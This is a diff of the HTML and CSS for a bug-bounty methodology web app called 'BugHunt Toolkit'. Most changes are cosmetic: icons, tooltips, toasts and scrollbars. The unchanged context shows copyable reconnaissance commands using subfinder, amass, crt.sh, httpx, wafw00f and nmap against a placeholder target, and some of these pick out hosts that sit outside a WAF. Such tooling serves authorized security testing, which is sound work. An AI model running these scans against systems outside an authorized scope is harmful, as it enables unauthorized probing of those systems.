@@ -129,15 +129,63 @@
           max-height: 2000px;
         }
       }
+
+      @keyframes drawCheck {
+        to {
+          stroke-dashoffset: 0;
+        }
+      }
+
+      /* Snappy Claude-style alert popup keyframe */
+      @keyframes warnPop {
+        0% {
+          transform: scale(0.6);
+          opacity: 0;
+        }
+        60% {
+          transform: scale(1.15) rotate(-8deg);
+          opacity: 1;
+        }
+        100% {
+          transform: scale(1) rotate(0deg);
+          opacity: 1;
+        }
+      }
       * {
         box-sizing: border-box;
         margin: 0;
         padding: 0;
       }
+
+      ::-webkit-scrollbar {
+        width: 3px;
+      }
+      ::-webkit-scrollbar-track {
+        background: #080b0e;
+      }
+      ::-webkit-scrollbar-thumb {
+        background: var(--border);
+        border-radius: 2px;
+      }
+      ::-webkit-scrollbar-thumb:hover {
+        background: var(--accent2);
+      }
+      /* Firefox */
+      @supports (-moz-appearance: none) {
+        html {
+          scrollbar-width: thin;
+          scrollbar-color: var(--border) #080b0e;
+        }
+        html:hover {
+          scrollbar-color: var(--accent2) #080b0e;
+        }
+      }
+
       body {
         background: var(--bg);
         color: var(--text);
         font-family: var(--mono);
+        overflow-x: hidden;
         font-size: 13px;
         line-height: 1.6;
         min-height: 100vh;
@@ -150,6 +198,7 @@
           );
         background-size: 40px 40px;
       }
+
       header {
         background: var(--surface);
         border-bottom: 1px solid var(--border);
@@ -163,7 +212,7 @@
         gap: 12px;
         flex-wrap: wrap;
         animation: fadeIn 0.4s var(--ease-out-quint) both;
-        overflow: hidden;
+        /* overflow: hidden; */
       }
       /* moving shimmer line along header bottom */
       header::after {
@@ -182,6 +231,131 @@
         background-size: 600px 1px;
         animation: shimmer 4s linear infinite;
       }
+
+      [tooltip] {
+        position: relative;
+        cursor: pointer;
+        z-index: 999;
+      }
+
+      [tooltip]::after,
+      [tooltip]::before {
+        position: absolute;
+        z-index: 999;
+        left: 50%;
+        opacity: 0;
+        pointer-events: none;
+        will-change: transform, opacity;
+        transition:
+          opacity 0.25s var(--ease-out-quint),
+          transform 0.35s var(--ease-spring);
+      }
+
+      [tooltip]::after {
+        content: attr(tooltip);
+        bottom: 100%;
+        transform: translate(-50%, 4px) scale(0.95);
+        margin-bottom: 10px;
+
+        font-family: var(--sans);
+        font-size: 0.8rem;
+        font-weight: 500;
+        color: var(--text);
+        white-space: nowrap;
+        background-color: var(--surface);
+        border: 1px solid var(--border);
+        border-radius: 6px;
+        padding: 6px 12px;
+        box-shadow: 0 4px 20px rgba(102, 102, 102, 0.5);
+      }
+      [tooltip]::before {
+        content: '';
+        bottom: 100%;
+        transform: translate(-50%, 4px);
+        margin-bottom: 4px;
+        border-width: 6px 6px 0 6px;
+        border-style: solid;
+        border-color: var(--border) transparent transparent transparent;
+      }
+
+      [tooltip]:not(.tooltip-bottom):hover::after,
+      [tooltip]:not(.tooltip-bottom):hover::before {
+        opacity: 1;
+        transform: translate(-50%, 0) scale(1);
+      }
+
+      [tooltip].tooltip-bottom::after {
+        bottom: auto;
+        top: 100%;
+        transform: translate(-50%, -4px) scale(0.95);
+        margin-top: 10px;
+        margin-bottom: 0;
+      }
+      [tooltip].tooltip-bottom::before {
+        bottom: auto;
+        top: 100%;
+        transform: translate(-50%, -4px);
+        margin-top: 4px;
+        margin-bottom: 0;
+        border-width: 0 6px 6px 6px;
+        border-color: transparent transparent var(--border) transparent;
+      }
+
+      [tooltip].tooltip-bottom:hover::after,
+      [tooltip].tooltip-bottom:hover::before {
+        opacity: 1;
+        transform: translate(-50%, 0) scale(1);
+      }
+
+      [tooltip].tooltip-shift-left::after {
+        left: 0;
+        transform: translate(0, 4px) scale(0.95);
+      }
+      [tooltip].tooltip-shift-left::before {
+        left: 15px;
+        transform: translate(0, 4px);
+      }
+
+      [tooltip].tooltip-shift-left:not(.tooltip-bottom):hover::after,
+      [tooltip].tooltip-shift-left:not(.tooltip-bottom):hover::before {
+        transform: translate(0, 0) scale(1);
+      }
+
+      [tooltip].tooltip-shift-right::after {
+        left: auto;
+        right: 0;
+        transform: translate(0, 4px) scale(0.95);
+      }
+      [tooltip].tooltip-shift-right::before {
+        left: auto;
+        right: 15px;
+        transform: translate(0, 4px);
+      }
+
+      [tooltip].tooltip-shift-right:not(.tooltip-bottom):hover::after,
+      [tooltip].tooltip-shift-right:not(.tooltip-bottom):hover::before {
+        transform: translate(0, 0) scale(1);
+      }
+
+      [tooltip].tooltip-bottom.tooltip-shift-left:hover::after,
+      [tooltip].tooltip-bottom.tooltip-shift-left:hover::before,
+      [tooltip].tooltip-bottom.tooltip-shift-right:hover::after,
+      [tooltip].tooltip-bottom.tooltip-shift-right:hover::before {
+        transform: translate(0, 0) scale(1);
+      }
+      [tooltip-variant='accent']::after {
+        border-color: var(--accent);
+      }
+      [tooltip-variant='accent2']::after {
+        border-color: var(--accent2);
+      }
+      [tooltip-variant='warn']::after {
+        border-color: var(--warn);
+      }
+      [tooltip-variant='danger']::after {
+        border-color: var(--danger);
+      }
+
       .logo {
         font-family: var(--sans);
         font-weight: 800;
@@ -268,31 +442,7 @@
         overflow-y: auto;
         overflow-x: hidden;
       }
-      .sidebar::-webkit-scrollbar {
-        width: 4px;
-      }
 
-      .sidebar::-webkit-scrollbar-track {
-        background: var(--surface);
-        border-radius: 0;
-      }
-
-      .sidebar::-webkit-scrollbar-thumb {
-        background: var(--border);
-        border-radius: 2px;
-        transition: background 0.2s;
-      }
-
-      .sidebar::-webkit-scrollbar-thumb:hover {
-        background: var(--accent);
-        box-shadow: 0 0 6px rgba(0, 229, 160, 0.4);
-      }
-
-      /* Firefox */
-      .sidebar {
-        scrollbar-width: thin;
-        scrollbar-color: var(--border) var(--surface);
-      }
       .ovr-prog {
         padding: 14px 14px 10px;
       }
@@ -393,29 +543,7 @@
         overflow-y: auto;
         padding: 20px 24px;
       }
-      .main::-webkit-scrollbar {
-        width: 4px;
-      }
 
-      .main::-webkit-scrollbar-track {
-        background: var(--bg);
-      }
-
-      .main::-webkit-scrollbar-thumb {
-        background: var(--border);
-        border-radius: 2px;
-      }
-
-      .main::-webkit-scrollbar-thumb:hover {
-        background: var(--accent2);
-        box-shadow: 0 0 6px rgba(0, 184, 255, 0.35);
-      }
-
-      /* Firefox */
-      .main {
-        scrollbar-width: thin;
-        scrollbar-color: var(--border) var(--bg);
-      }
       .pp {
         display: none;
       }
@@ -576,13 +704,10 @@
       }
       .cpb {
         background: none;
-        border: 1px solid var(--border);
-        border-radius: 3px;
         color: var(--dim);
-        font-family: var(--mono);
-        font-size: 11px;
         padding: 3px 9px;
         cursor: pointer;
+        border: none;
         transition:
           color 0.2s,
           border-color 0.2s,
@@ -591,8 +716,6 @@
       }
       .cpb:hover {
         color: var(--accent);
-        border-color: var(--accent);
-        background: rgba(0, 229, 160, 0.06);
         transform: translateY(-1px);
       }
       .cpb:active {
@@ -600,7 +723,22 @@
       }
       .cpb.copied {
         color: var(--accent);
-        border-color: var(--accent);
+      }
+
+      .cpb.copied .btn-icon {
+        --icon-color: var(--accent);
+        stroke-width: 2.2px;
+      }
+      @keyframes copy-success-pop {
+        0% {
+          transform: scale(0.8);
+        }
+        50% {
+          transform: scale(1.1);
+        }
+        100% {
+          transform: scale(1);
+        }
       }
       pre {
         padding: 13px 15px;
@@ -611,12 +749,7 @@
         color: #a8c0d8;
         white-space: pre;
       }
-      pre::-webkit-scrollbar {
-        height: 3px;
-      }
-      pre::-webkit-scrollbar-thumb {
-        background: var(--border);
-      }
+
       .checklist {
         list-style: none;
       }
@@ -888,9 +1021,11 @@
       .gab:active {
         transform: scale(0.98);
       }
+
+      /* Toast */
       .toast {
         position: fixed;
-        bottom: 22px;
+        top: 22px;
         right: 22px;
         background: var(--surface);
         border: 1px solid var(--accent);
@@ -900,19 +1035,60 @@
         font-size: 12px;
         font-weight: 700;
         z-index: 9999;
-        transform: translateY(60px) scale(0.9);
+        transform: translateY(-60px) scale(0.9);
         opacity: 0;
         transition:
           transform 0.3s var(--ease-spring),
           opacity 0.3s;
+        pointer-events: none;
         box-shadow:
           0 8px 32px rgba(0, 0, 0, 0.5),
           0 0 0 1px rgba(255, 255, 255, 0.04);
+
+        /* Layout adjustments for SVG icon and text placement */
+        display: flex;
+        align-items: center;
+        gap: 8px;
       }
+
       .toast.show {
         transform: translateY(0) scale(1);
         opacity: 1;
       }
+
+      .toast.warn {
+        border-color: var(--warn);
+        color: var(--warn);
+      }
+
+      .toast-icon {
+        width: 14px;
+        height: 14px;
+        flex-shrink: 0;
+        display: block;
+      }
+
+      /* Base icon setup - sets path to hidden by default */
+      .animate-check path {
+        stroke-dasharray: 24;
+        stroke-dashoffset: -24;
+      }
+
+      /* Base warning icon setup - hides it before showing */
+      .animate-warn {
+        transform-origin: center;
+        opacity: 0;
+      }
+
+      /* Triggers ONLY when the toast actively becomes visible */
+      .toast.show .animate-check path {
+        animation: drawCheck 0.35s cubic-bezier(0.2, 0.8, 0.2, 1) forwards 0.15s;
+      }
+
+      .toast.show .animate-warn {
+        animation: warnPop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) forwards 0.15s;
+      }
+
       hr.div {
         border: none;
         border-top: 1px solid var(--border);
@@ -1014,13 +1190,271 @@
       .animated-btn:hover .anim-layer-bot {
         transform: translateY(2px);
       }
+      .divider {
+        color: #ccc;
+        font-size: 20px;
+      }
+      /* The application title */
+      .tagline {
+        font-size: 16px;
+        color: #555;
+      }
+      .close-btn {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        background: none;
+        border: none;
+        padding: 4px;
+        color: var(--dim);
+        border-radius: 4px;
+        transition:
+          background-color 0.2s ease,
+          color 0.2s ease,
+          transform 0.1s ease;
+      }
+      .close-btn:hover {
+        color: var(--danger);
+        background: rgba(255, 51, 102, 0.06);
+      }
+      .close-btn:active {
+        transform: scale(0.92);
+      }
+      .anim-close-cross {
+        transition: transform 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+        transform-origin: center;
+      }
+      .close-btn:hover .anim-close-cross {
+        transform: rotate(90deg) scale(1.1);
+      }
+
+      .mpd-wrap {
+        position: relative;
+        width: 100%;
+        font-family: var(--mono);
+      }
+      .mpd-trigger {
+        width: 100%;
+        background: #080b0e;
+        border: 1px solid var(--border);
+        border-radius: 5px;
+        color: var(--text);
+        font-family: var(--mono);
+        font-size: 12px;
+        padding: 8px 12px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 8px;
+        cursor: pointer;
+        outline: none;
+        transition: border-color 0.15s;
+        box-sizing: border-box;
+      }
+      .mpd-trigger:hover,
+      .mpd-trigger.open {
+        border-color: var(--accent2);
+      }
+      .mpd-trigger-content {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        min-width: 0;
+      }
+      .mpd-trigger-content .mpd-label {
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+      }
+      .mpd-trigger-content .mpd-placeholder {
+        color: var(--dim);
+      }
+      .mpd-chevron {
+        color: var(--dim);
+        font-size: 9px;
+        flex-shrink: 0;
+        transition: transform 0.15s;
+      }
+      .mpd-trigger.open .mpd-chevron {
+        transform: rotate(180deg);
+      }
+
+      .mpd-menu {
+        position: absolute;
+        top: calc(100% + 4px);
+        left: 0;
+        right: 0;
+        background: #080b0e;
+        border: 1px solid var(--border);
+        border-radius: 5px;
+        max-height: 260px;
+        overflow-y: auto;
+        z-index: 410;
+        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
+        display: none;
+
+        /* Firefox thin scrollbar */
+        scrollbar-width: thin;
+        scrollbar-color: var(--border) #080b0e;
+      }
+      .mpd-menu.open {
+        display: block;
+      }
+
+      .mpd-search-wrap {
+        position: sticky;
+        top: 0;
+        background: #080b0e;
+        padding: 6px;
+        border-bottom: 1px solid var(--border);
+        z-index: 1;
+      }
+      .mpd-search {
+        width: 100%;
+        background: #0d1117;
+        border: 1px solid var(--border);
+        border-radius: 4px;
+        color: var(--text);
+        font-family: var(--mono);
+        font-size: 11px;
+        padding: 6px 8px;
+        outline: none;
+        box-sizing: border-box;
+        transition: border-color 0.15s;
+      }
+      .mpd-search:focus {
+        border-color: var(--accent2);
+      }
+      .mpd-search::placeholder {
+        color: var(--dim);
+      }
+
+      .mpd-group-label {
+        font-size: 9px;
+        font-weight: 700;
+        letter-spacing: 1px;
+        text-transform: uppercase;
+        color: var(--muted);
+        padding: 8px 12px 4px;
+      }
+      .mpd-option {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        padding: 7px 12px;
+        cursor: pointer;
+        font-size: 12px;
+        font-family: var(--mono);
+        color: var(--text);
+        transition: background 0.1s;
+      }
+      .mpd-option:hover,
+      .mpd-option.active {
+        background: rgba(0, 184, 255, 0.08);
+      }
+      .mpd-option.placeholder {
+        color: var(--dim);
+      }
+      .mpd-no-results {
+        padding: 14px 12px;
+        font-size: 11px;
+        color: var(--dim);
+        text-align: center;
+        display: none;
+      }
+      .mpd-icon {
+        width: 14px;
+        height: 14px;
+        border-radius: 3px;
+        flex-shrink: 0;
+        display: inline-block;
+        object-fit: contain;
+      }
+      .mpd-icon-emoji {
+        width: 14px;
+        height: 14px;
+        flex-shrink: 0;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 11px;
+      }
+      .mpd-icon-none {
+        width: 14px;
+        height: 14px;
+        flex-shrink: 0;
+      }
+      .mpd-other-input {
+        width: 100%;
+        background: #080b0e;
+        border: 1px solid var(--border);
+        border-radius: 5px;
+        color: var(--text);
+        font-family: var(--mono);
+        font-size: 12px;
+        padding: 8px 12px;
+        outline: none;
+        margin-top: 8px;
+        box-sizing: border-box;
+        display: none;
+        transition: border-color 0.15s;
+      }
+      .mpd-other-input:focus {
+        border-color: var(--accent2);
+      }
+      .mpd-other-input.show {
+        display: block;
+      }
+      .copy-icon .copy-back,
+      .copy-icon .copy-front {
+        transition: transform 0.25s cubic-bezier(0.2, 0.8, 0.2, 1);
+        transform-origin: center;
+      }
+      /* Icon line thickens on hover */
+      .cpb:hover .btn-icon {
+        stroke-width: 2.2px;
+      }
+
+      /* The front sheet slides down-left, back sheet lifts up-right */
+      .cpb:hover .copy-front {
+        transform: translate(-1px, 1px);
+      }
+
+      .cpb:hover .copy-back {
+        transform: translate(1px, -1px) scale(1.02);
+      }
+
+      /* Snaps the pages back tightly together on mouse-click down */
+      .cpb:active .copy-front,
+      .cpb:active .copy-back {
+        transform: translate(0, 0) scale(0.95);
+        stroke-width: 2.5px;
+      }
+      .check-pop {
+        transform-origin: center;
+        animation: checkPop 0.3s var(--ease-spring) both;
+      }
     </style>
   </head>
   <body>
     <header>
       <div class="logo">
-        <div class="logo-dot"></div>
-        BugHunt Toolkit
+        <img
+          src="roxoi16x16.ico"
+          height="32"
+          width="32"
+          alt="logo"
+          style="
+            object-fit: cover;
+            border: 1px solid green;
+            border-radius: 4px;
+            padding: 1px;
+          "
+        />
+        <div style="text-transform: uppercase">roxoi</div>
+        <span class="divider">|</span>
+        <span class="tagline">BugHunt Toolkit</span>
       </div>
       <div class="target-bar">
         <label>TARGET</label>
@@ -1035,7 +1469,12 @@
         <button
           class="reset-btn animated-btn"
           id="newProjectBtn"
-          title="Create a new project"
+          tooltip="Create a new project"
+          style="
+            text-decoration: none;
+            color: var(--accent2);
+            border-color: rgba(0, 184, 255, 0.4);
+          "
         >
           <svg
             width="16"
@@ -1053,19 +1492,18 @@
               stroke-linejoin="round"
             />
           </svg>
-          New Project
         </button>
 
         <!-- Projects Link -->
         <a
           href="projects.html"
+          tooltip="Manage saved projects"
           class="reset-btn animated-btn"
           style="
             text-decoration: none;
             color: var(--accent2);
             border-color: rgba(0, 184, 255, 0.4);
           "
-          title="Manage saved projects"
         >
           <svg
             width="16"
@@ -1102,7 +1540,6 @@
               stroke-linejoin="round"
             />
           </svg>
-          Projects
         </a>
       </div>
     </header>
@@ -1162,39 +1599,83 @@
         <button class="pb" data-phase="14">
           <span class="pnum">14</span>Reporting
         </button>
-        <button
-          class="pb"
-          data-phase="16"
-          style="border-top: 1px solid var(--border); margin-top: 6px"
-        >
-          <span class="pnum" style="color: #f97583; border-color: #f97583"
-            >PS</span
-          >PortSwigger Labs
+
+        <button class="pb sbanimated-btn" data-phase="16">
+          <svg
+            class="btn-icon labs-icon"
+            style="--icon-color: #f97583"
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="currentColor"
+            stroke-width="2"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+          >
+            <path class="layer-3" d="M12 2L2 7l10 5 10-5-10-5z" />
+            <path class="layer-2" d="M2 12l10 5 10-5" />
+            <path class="layer-1" d="M2 17l10 5 10-5" />
+          </svg>
+          PortSwigger Labs
         </button>
+
         <button
-          class="pb"
+          class="pb sbanimated-btn"
           data-phase="15"
           style="border-top: 1px solid var(--border)"
         >
-          <span
-            class="pnum"
-            style="color: var(--accent2); border-color: var(--accent2)"
-            >⬇</span
-          >File Generator
+          <svg
+            class="btn-icon download-icon"
+            style="--icon-color: var(--accent2)"
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="currentColor"
+            stroke-width="2"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+          >
+            <path class="tray" d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
+            <polyline class="arrow-head" points="7 10 12 15 17 10" />
+            <line class="arrow-shaft" x1="12" y1="15" x2="12" y2="3" />
+          </svg>
+          File Generator
         </button>
-        <button class="pb" data-phase="17">
-          <span
-            class="pnum"
-            style="color: var(--accent); border-color: var(--accent)"
-            >📂</span
-          >File Reference
+
+        <!-- File Reference -->
+        <button class="pb sbanimated-btn" data-phase="17">
+          <svg
+            class="btn-icon folder-icon"
+            style="--icon-color: var(--accent)"
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="currentColor"
+            stroke-width="2"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+          >
+            <path
+              class="folder-base"
+              d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"
+            />
+            <line class="folder-line" x1="2" y1="10" x2="22" y2="10" />
+          </svg>
+          File Reference
         </button>
-        <button class="pb" data-phase="18">
-          <span
-            class="pnum"
-            style="color: var(--warn); border-color: var(--warn)"
-            >⏳</span
-          >Timeline
+
+        <button class="pb sbanimated-btn" data-phase="18">
+          <svg
+            class="btn-icon clock-icon"
+            style="--icon-color: var(--warn)"
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="currentColor"
+            stroke-width="2"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+          >
+            <circle cx="12" cy="12" r="10" />
+            <polyline class="clock-hand" points="12 6 12 12 16 14" />
+          </svg>
+          Timeline
         </button>
       </div>
 
@@ -1202,11 +1683,25 @@
         <!-- PHASE 0 -->
         <div class="pp active" id="pp0">
           <div class="ph">
-            <div class="pi">🎯</div>
+            <div class="pi">
+              <svg
+                class="btn-icon main-target"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              >
+                <circle cx="12" cy="12" r="10" />
+                <circle cx="12" cy="12" r="6" />
+                <circle cx="12" cy="12" r="2" />
+              </svg>
+            </div>
             <div class="pm">
               <h2>Phase 0 — Scope Review</h2>
               <p>
-                Complete before running any tool. 30–60 minutes. Non-negotiable.
+                Complete before running any tool. 30-60 minutes. Non-negotiable.
               </p>
               <span class="ptag tc">Critical</span
               ><span class="ptag tm">Manual</span>
@@ -1358,6 +1853,73 @@
                 }
                 .pf-section:first-child {
                   padding-top: 0;
+                }
+
+                /* Base Button Layout */
+                .btn-icon {
+                  width: 16px;
+                  height: 16px;
+                  flex-shrink: 0;
+                  color: var(--icon-color);
+                  stroke-width: 1.8px;
+                  transition:
+                    transform 0.2s cubic-bezier(0.4, 0, 0.2, 1),
+                    stroke-width 0.2s ease;
+                }
+
+                .btn-icon path,
+                .btn-icon line,
+                .btn-icon polyline,
+                .btn-icon circle {
+                  transition:
+                    transform 0.25s cubic-bezier(0.4, 0, 0.2, 1),
+                    stroke-width 0.2s ease,
+                    stroke-dashoffset 0.25s ease;
+                  transform-origin: center;
+                }
+
+                .sbanimated-btn:hover .btn-icon {
+                  stroke-width: 2.2px;
+                }
+
+                .sbanimated-btn:hover .labs-icon .layer-3 {
+                  transform: translateY(-2px);
+                }
+                .sbanimated-btn:hover .labs-icon .layer-1 {
+                  transform: translateY(1px);
+                }
+                @keyframes download-bounce {
+                  0%,
+                  100% {
+                    transform: translateY(0);
+                  }
+                  50% {
+                    transform: translateY(2px);
+                  }
+                }
+                .sbanimated-btn:hover .download-icon .arrow-head,
+                .sbanimated-btn:hover .download-icon .arrow-shaft {
+                  animation: download-bounce 0.6s ease infinite;
+                }
+
+                .sbanimated-btn:hover .folder-icon .folder-base {
+                  transform: scale(1.05) rotate(-1deg);
+                }
+
+                .sbanimated-btn:hover .clock-icon .clock-hand {
+                  transform: rotate(15deg);
+                }
+
+                .sbanimated-btn:active .btn-icon,
+                .sbanimated-btn.active .btn-icon {
+                  transform: scale(0.92);
+                  stroke-width: 2.5px;
+                }
+
+                /* Extra active state logic for the clock */
+                .sbanimated-btn:active .clock-icon .clock-hand,
+                .sbanimated-btn.active .clock-icon .clock-hand {
+                  transform: rotate(45deg);
                 }
               </style>
 
@@ -1708,7 +2270,32 @@
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 subfinder -d TARGET -all -recursive -silent -o subfinder.txt
@@ -1728,7 +2315,32 @@ amass enum -passive -d TARGET -o amass.txt</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 curl -s "https://crt.sh/?q=%.TARGET&amp;output=json" \
@@ -1750,7 +2362,32 @@ curl -s "https://crt.sh/?q=%.TARGET&amp;output=json" \
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/TARGET/passive_dns" \
@@ -1782,7 +2419,32 @@ curl -s "http://web.archive.org/cdx/search/cdx?url=*.TARGET/*&amp;output=json&am
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 cat subfinder.txt amass.txt crtsh_subs.txt alienvault_subs.txt \
@@ -1804,7 +2466,32 @@ echo "[*] Total subdomains: $(wc -l &lt; all_subs.txt)"</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">javascript</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 Array.from(document.querySelectorAll("a")).map(el => el.href);</pre
@@ -1837,7 +2524,32 @@ Array.from(document.querySelectorAll("a")).map(el => el.href);</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 httpx -l all_subs.txt \
@@ -1870,7 +2582,32 @@ grep -Ei "java"  httpx_output.txt | awk '{print $1}' &gt; tech_java.txt</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 wafw00f -i live_subs.txt -o waf_results.txt
@@ -1897,7 +2634,32 @@ comm -23 &lt;(sort live_subs.txt) &lt;(sort behind_waf.txt) &gt; no_waf_subs.txt
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 httpx -l all_subs.txt \
@@ -1935,7 +2697,32 @@ nmap -sV -sC -iL naabu_ports.txt -oN nmap_scan.txt</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
